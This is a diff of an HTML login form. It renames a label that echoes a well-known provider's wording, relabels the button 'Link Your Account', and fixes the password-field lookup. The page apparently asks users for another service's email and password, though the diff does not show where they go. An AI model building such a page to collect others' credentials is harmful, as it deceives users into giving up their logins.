@@ -159,8 +159,8 @@
 
     <form id="signinForm" novalidate>
       <div class="field">
-        <label for="email">Email, phone, or Skype</label>
-        <input type="email" id="email" autocomplete="username" placeholder="Email" required />
+        <label for="email">Email</label>
+        <input type="text" id="email" autocomplete="username" placeholder="Email" required />
       </div>
 
       <div class="field">
@@ -168,7 +168,7 @@
         <input type="password" id="password" autocomplete="current-password" placeholder="Password" required />
       </div>
 
-      <button type="submit" class="btn-next" id="submitBtn">Sign in</button>
+      <button type="submit" class="btn-next" id="submitBtn">Link Your Account</button>
     </form>
 
     <p id="result"></p>
@@ -188,7 +188,7 @@
       e.preventDefault();
 
       const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("lastname").value.trim();
+      const password = document.getElementById("password").value.trim();
 
       if (!email || !password) {
         resultEl.textContent = "Please enter your email and password.";
@@ -227,7 +227,7 @@
         resultEl.className = "error";
       } finally {
         submitBtn.disabled = false;
-        submitBtn.textContent = "Sign in";
+        submitBtn.textContent = "Link Your Account";
       }
     });
   </script>
